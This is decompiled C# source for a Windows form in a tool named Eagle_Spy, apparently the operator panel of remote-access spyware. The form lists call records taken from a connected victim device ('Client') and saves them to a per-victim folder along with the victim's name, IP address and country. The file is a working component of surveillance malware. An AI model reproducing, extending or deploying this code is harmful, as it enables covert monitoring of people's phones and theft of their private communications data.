using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000047 RID: 71
	[DesignerGenerated]
	public partial class EagleSpyCallLogs : Form
	{
		// Token: 0x06000488 RID: 1160 RVA: 0x000035DF File Offset: 0x000017DF
		public EagleSpyCallLogs()
		{
			base.Load += this.Craxscallslog_Load;
			base.Deactivate += this.Craxscallslog_Deactivate;
			this.InitializeComponent();
		}

		// Token: 0x06000489 RID: 1161 RVA: 0x0005DF6C File Offset: 0x0005C16C
		private void Craxscallslog_Load(object sender, EventArgs e)
		{
			base.Location = new Point(checked(Cursor.Position.X - 79), Cursor.Position.Y);
			this.BackColor = Color.DarkRed;
			base.TransparencyKey = Color.DarkRed;
			try
			{
				if (this.ClassClient != null)
				{
					if (this.ClassClient.CALLS.Count<string>() > 0)
					{
						this.callstext.Text = "Calls Monitor...\r\nــــــــــــــــــــــ\r\n\r\n";
						string[] calls = this.ClassClient.CALLS;
						string[] array = calls;
						foreach (string text in array)
						{
							try
							{
								if (text != null && text.Length > 0)
								{
									TextBox textBox;
									(textBox = this.callstext).Text = textBox.Text + text + "\r\nــــــــــــــــــــــ\r\n\r\n";
								}
							}
							catch (Exception)
							{
							}
						}
					}
					else
					{
						this.callstext.Text = "No New Calls...";
					}
				}
				this.ClassClient.isnewcall = false;
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600048A RID: 1162 RVA: 0x00003611 File Offset: 0x00001811
		private void Checkbutton_Click(object sender, EventArgs e)
		{
			this.callstext.Text = "";
			this.ClassClient.CALLS = new string[251];
			base.Close();
		}

		// Token: 0x0600048B RID: 1163 RVA: 0x00002D2D File Offset: 0x00000F2D
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0600048C RID: 1164 RVA: 0x0005E080 File Offset: 0x0005C280
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.callstext.Text))
			{
				EagleAlert.Showinformation("No log found to save");
				return;
			}
			try
			{
				if (!Directory.Exists(this.ClassClient.FolderUSER + "\\Calls_Log"))
				{
					Directory.CreateDirectory(this.ClassClient.FolderUSER + "\\Calls_Log");
				}
				string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
				if (!File.Exists(this.ClassClient.FolderUSER + "\\Calls_Log\\" + text))
				{
					File.Create(this.ClassClient.FolderUSER + "\\Calls_Log\\" + text).Dispose();
					File.AppendAllText(this.ClassClient.FolderUSER + "\\Calls_Log\\" + text, string.Concat(new string[]
					{
						"Client Name: ",
						this.ClassClient.ClientName,
						"\r\nClient IP: ",
						this.ClassClient.ClientAddressIP,
						"\r\nCountry: ",
						this.ClassClient.Country,
						"\r\nDate :",
						DateTime.Now.ToString(),
						"\r\n----------------------------------------\r\n"
					}));
				}
				File.AppendAllText(this.ClassClient.FolderUSER + "\\Calls_Log\\" + text, text + this.callstext.Text + "\r\n");
				Process.Start(this.ClassClient.FolderUSER + "\\Calls_Log");
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600048D RID: 1165 RVA: 0x00002D2D File Offset: 0x00000F2D
		private void Craxscallslog_Deactivate(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x040003FB RID: 1019
		public Client ClassClient;
	}
}
